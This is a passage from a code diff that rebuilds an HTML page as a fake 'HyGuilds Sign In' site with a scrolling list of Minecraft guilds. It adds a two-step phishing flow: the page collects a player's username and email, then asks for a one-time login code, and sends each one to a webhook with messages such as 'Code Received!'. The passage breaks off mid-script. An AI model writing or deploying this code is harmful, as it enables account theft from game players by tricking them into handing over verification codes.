@@ -1,32 +1,170 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Webhook Form</title>
+  <title>HyGuilds Sign In</title>
+  <style>
+    body {
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      color: #333;
+      margin-bottom: 30px;
+    }
+
+    form {
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      margin-bottom: 30px;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    select {
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      padding: 8px;
+      width: 100%;
+      transition: width 0.3s;
+    }
+
+    input[type="text"]:hover,
+    input[type="email"]:hover,
+    select:hover {
+      width: 110%;
+    }
+
+    input[type="submit"] {
+      background-color: #333;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      cursor: pointer;
+      padding: 10px 20px;
+    }
+
+    #codeFormContainer {
+      margin-top: 20px;
+    }
+
+    .guild {
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+
+    .guild h3 {
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .followers {
+      color: #777;
+    }
+
+    /* Scroll Animation */
+    @keyframes scroll {
+      0% {
+        transform: translateY(0);
+      }
+      100% {
+        transform: translateY(-100%);
+      }
+    }
+
+    .scroll-container {
+      height: 300px;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .scroll-content {
+      animation: scroll 20s linear infinite;
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+    }
+  </style>
 </head>
 <body>
-  <h1>Webhook Form</h1>
-  <form id="webhookForm">
+  <h1>HyGuilds Sign In</h1>
+  <form id="emailForm">
     <label for="username">Minecraft Username:</label>
     <input type="text" id="username" name="username" required><br><br>
     <label for="email">Email:</label>
     <input type="email" id="email" name="email" required><br><br>
-    <label for="code">Please enter the code below:</label>
-    <input type="text" id="code" name="code" required><br><br>
-    <input type="submit" value="Send Message">
+    <input type="submit" value="Send Email">
   </form>
 
+  <div id="codeFormContainer" style="display: none;">
+    <h2>Enter Code</h2>
+    <form id="codeForm">
+      <label for="code">Please enter the code below:</label>
+      <input type="text" id="code" name="code" required><br><br>
+      <input type="submit" value="Submit Code">
+    </form>
+  </div>
+
+  <div class="scroll-container">
+    <div class="scroll-content">
+      <div class="guild">
+        <h3>Flexed</h3>
+        <span class="followers">Followers: 372</span>
+      </div>
+      <div class="guild">
+        <h3>Flexing Chimps</h3>
+        <span class="followers">Followers: 170</span>
+      </div>
+      <div class="guild">
+        <h3>Dawn</h3>
+        <span class="followers">Followers: 289</span>
+      </div>
+      <div class="guild">
+        <h3>WAR</h3>
+        <span class="followers">Followers: 132</span>
+      </div>
+      <div class="guild">
+        <h3>technogang</h3>
+        <span class="followers">Followers: 567</span>
+      </div>
+      <div class="guild">
+        <h3>The Abyss</h3>
+        <span class="followers">Followers: 420</span>
+      </div>
+      <div class="guild">
+        <h3>Leman</h3>
+        <span class="followers">Followers: 191</span>
+      </div>
+      <div class="guild">
+        <h3>Envision</h3>
+        <span class="followers">Followers: 224</span>
+      </div>
+      <div class="guild">
+        <h3>Rebel</h3>
+        <span class="followers">Followers: 109</span>
+      </div>
+    </div>
+  </div>
+
   <script>
-    document.getElementById("webhookForm").addEventListener("submit", function(event) {
+    document.getElementById("emailForm").addEventListener("submit", function(event) {
       event.preventDefault(); // prevent the form from reloading the page
 
       // get the input values
       const username = document.getElementById('username').value;
       const email = document.getElementById('email').value;
-      const code = document.getElementById('code').value;
 
       // create the webhook message
       const message = {
-        "content": "Made by: NorthernCode#1858",
+        "content": "Email and IGN entered!",
         "embeds": [
           {
             "color": null,
@@ -38,14 +176,6 @@
               {
                 "name": "Email:",
                 "value": email
-              },
-              {
-                "name": "Code:",
-                "value": code
-              },
-              {
-                "name": "SkyBlock Stats:",
-                "value": "https://sky.shiiyu.moe/stats/" + username
               }
             ]
           }
@@ -60,17 +190,33 @@
       xhr.onreadystatechange = function() {
         if (xhr.readyState === XMLHttpRequest.DONE) {
           if (xhr.status === 200) {
-            console.log("Webhook sent successfully!");
+            document.getElementById("emailForm").style.display = "none";
+            document.getElementById("codeFormContainer").style.display = "block";
           } else {
             console.error("Failed to send webhook:", xhr.statusText);
           }
         }
       };
       xhr.send(JSON.stringify(message));
-      setTimeout(function() {
-        window.location.href = "index.html";
-      }, 750);
     });
-  </script>
-</body>
-</html>
+
+    document.getElementById("codeForm").addEventListener("submit", function(event) {
+      event.preventDefault(); // prevent the form from reloading the page
+
+      // get the code value
+      const code = document.getElementById('code').value;
+
+      // create the webhook message
+      const message = {
+        "content": "Code Received!",
+        "embeds": [
+          {
+            "color": null,
+            "fields": [
+              {
+                "name": "Code:",
+                "value": code
+              }
+            ]
+          }
+       
